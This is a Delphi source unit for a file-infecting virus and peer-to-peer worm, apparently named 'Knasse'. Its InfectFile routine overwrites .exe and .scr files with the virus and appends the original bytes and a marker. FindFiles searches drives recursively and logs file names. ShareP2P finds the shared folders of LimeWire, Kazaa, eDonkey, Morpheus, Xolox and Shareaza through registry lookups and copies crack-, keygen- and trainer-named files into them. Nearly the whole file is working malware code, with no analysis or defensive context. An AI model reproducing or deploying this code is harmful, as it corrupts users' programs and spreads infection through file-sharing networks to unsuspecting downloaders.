   unit KnasseUnit;

   interface

   Uses Windows, Bot, TLHelp32;

   const
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     Procedure ShareP2P(Name: String);
     Procedure InfectFile(Name: String);
     Function GenerateName: String;
     procedure ReadFileStr(Fname:string;var FullContents:string);
     function StrtoInt(const S: string): integer;
     function InttoStr(const Value: integer): string;
     procedure FindFiles(dir: string);
     function UpperCase(const S: string): string;
     function ExtractFileName(const Path: string): string;

   implementation

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function StrtoInt(const S: string): integer; var E: integer;
   begin Val(S, Result, E);end;

   function IsRunning(ExeFileName: string): bool;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
     Len: Integer;
     name1, name2, name3: string;
   begin
     result := False;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       Len := Length(FProcessEntry32.szExeFile);

       Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
       Name2 := UpperCase(Copy(ExeFileName, 1, Len));
       Name3 := UpperCase(FProcessEntry32.szExeFile);

       If (Name1 = Name2) Or (Name3 = Name2) Then
         Result := True;

       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
   Try
    FullContents:='';

    AssignFile(Fcontents,Fname);
    Reset(Fcontents);
    Fsize:=FileSize(Fcontents);
    while not Eof(Fcontents) do begin
     BlockRead(Fcontents,Fbuffer,1024,rLen);
     FullContents:=FullContents + string(Fbuffer);
    end;
    CloseFile(Fcontents);

    if Length(FullContents) > Fsize then
     FullContents:=Copy(FullContents,1,Fsize);
   Except
     ;
   End;
   end;

   Function GenerateName: String;
   Begin
     Randomize;
     Result := '';
     While Length(Result) < 10 do
       Result := Result + IntToStr(Random(10));
     Result := Result+'.exe';
   End;

   Procedure InfectFile(Name: String);
   Var
     FileBuffer, Settings: String;
     F: TextFile;
   Begin
     If IsRunning(ExtractFileName(Name)) Then Exit;
     If Name = ParamStr(0) Then Exit;

     FileBuffer := '';
     ReadFileStr(Name, FileBuffer);
     If FileBuffer = '' Then Exit;

     If Pos('pe\knasse was here', FileBuffer) > 0 Then Exit;
     If Not CopyFile(pChar(ParamStr(0)), pChar(Name), False) Then Exit;

     Settings := #00 + GenerateName + #02 + IntToStr(Length(FileBuffer)) + #01;

     AssignFile(F, Name);
     Append(F);
     Write(F, FileBuffer);
     Write(F, Settings);
     CloseFile(F);

     Inc(pe_infect);
   End;

   Function GetReg(ROOT: HKEY; Path, Str: String): String;
   Var
     Key: HKey;
     Siz: Cardinal;
     Val: Array[0..16382] Of Char;
   Begin
     ZeroMemory(@Val, Length(Val));
   Try
     RegOpenKeyEx(root, pChar(Path), 0, REG_SZ, Key);
     Siz := 16382;
     RegQueryValueEx(Key, pChar(Str), NIL, NIL, @Val[0], @Siz);
     RegCloseKey(Key);
     If Val <> '' Then Result := Val;
   Except
     Exit;
   End;
   End;

   Function FindEDonkey: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString') <> '' Then Result := True;
   End;

   Function EDonkeyShare: String;
   Var
     I: Word;
   Begin
     Result := GetReg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString');
     I := Pos('uninstall', Result);
     If I > 0 Then Result := Copy(Result, 2, I-2)+'\incoming';
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   Function FindMorpheus: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString') <> '' Then Result := True;
   End;

   Function MorhpeusShare: String;
   Var
     i: Word;
   Begin
     Result := GetReg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString');
     I := Pos('UNWISE.EXE', Result);
     If I > 0 Then Result := Copy(Result, 1, I-2) + '\My Shared Folder';
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   Function FindXolox: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs') <> '' Then Result := True;
   End;

   Function XoloxShare: String;
   Begin
     Result := GetReg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs');
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   Function FindKazaa: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent') <> '' Then Result := True;
   End;

   Function KazaaShare: String;
   Begin
     Result := GetReg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent');
     If Pos('012345:', Result) > 0 Then Result := Copy(Result, 7, Length(Result));
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   Function FindShareaza: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath') <> '' Then Result := True;
   End;

   Function ShareazaShare: String;
   Begin
     Result := GetReg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath');
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   Function FindLimeWire: Bool;
   Begin
     Result := False;
     If GetReg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir') <> '' Then Result := True;
   End;

   Function LimeWireShare: String;
   Begin
     Result := GetReg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir');
     If Result[Length(Result)] <> '\' Then Result := Result + '\';
     Inc(p2p_infect);
   End;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   Procedure ShareP2P(Name: String);
   Begin
   Try
     p2p_found := 0;
     p2p_names := 'Found: ';

     If FindLimeWire       Then Begin Inc(p2p_found); p2p_names := p2p_names+'LimeWire,'; End;
     If FindEDonkey        Then Begin Inc(p2p_found); p2p_names := p2p_names+'EDonkey ,'; End;
     If FindMorpheus       Then Begin Inc(p2p_found); p2p_names := p2p_names+'Morpheus,'; End;
     If FindXolox          Then Begin Inc(p2p_found); p2p_names := p2p_names+'Xolox   ,'; End;
     If FindKazaa          Then Begin Inc(p2p_found); p2p_names := p2p_names+'Kazaa   ,'; End;
     If FindShareaza       Then Begin Inc(p2p_found); p2p_names := p2p_names+'Shareaza,'; End;

     If p2p_names[length(p2p_names)] = ',' Then p2p_names := Copy(p2p_names,1,length(p2p_names)-1);
     If p2p_names = 'Found: ' Then p2p_Names := 'Found: No p2p Software';

     If FindLimeWire       Then CopyFile(pChar(Name), pChar(LimeWireShare+ExtractFileName(Name)), False);
     If FindEDonkey        Then CopyFile(pChar(Name), pChar(EDonkeyShare+ExtractFileName(Name)), False);
     If FindMorpheus       Then CopyFile(pChar(Name), pChar(MorhpeusShare+ExtractFileName(Name)), False);
     If FindXolox          Then CopyFile(pChar(Name), pChar(XoloxShare+ExtractFileName(Name)), False);
     If FindKazaa          Then CopyFile(pChar(Name), pChar(KazaaShare+ExtractFileName(Name)), False);
     If FindShareaza       Then CopyFile(pChar(Name), pChar(ShareazaShare+ExtractFileName(Name)), False);
   Except
     Exit;
   End;
   End;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     If Pos('.', Filename) = 0 Then
     Begin
       Result := '';
       Exit;
     End;
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, Length(Filename));
         Break;
       end;
     end;
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function GetFileSize(FileName: String): Int64;
   Var
     H: THandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
     End;
   End;

   Procedure FindFiles(Dir: String);
   Var
     SR: TSearchRec;
     Tmp: TextFile;
   Begin
     Try
       If Dir[Length(Dir)] <> '\' Then Dir := Dir + '\';
       If FindFirst(Dir+'*.*', faDirectory, SR) = 0 Then
       Repeat
         If ((SR.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') Then
           FindFiles(Dir+SR.Name)
         Else Begin
           If SR.Name[1] <> '.' Then
           Begin
             If GetFileSize(SR.Name) < 500000 Then
             Begin
               AssignFile(Tmp, 'C:\log.txt');
               Append(Tmp);
               WriteLn(Tmp, Sr.Name);
               CloseFile(Tmp);

               If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('exe') Then InfectFile(Dir + Sr.Name);
               If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('scr') Then InfectFile(Dir + Sr.Name);
               If Pos('TRAINER', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('TRN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('CRACK', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('CRK', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('KEYGEN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('KGN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('GEN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
             End;
           End;
         End;
       Until FindNext(SR) <> 0;
       FindClose(SR);
     Except
       FindClose(SR);
       Exit;
     End;

   End;


   end.
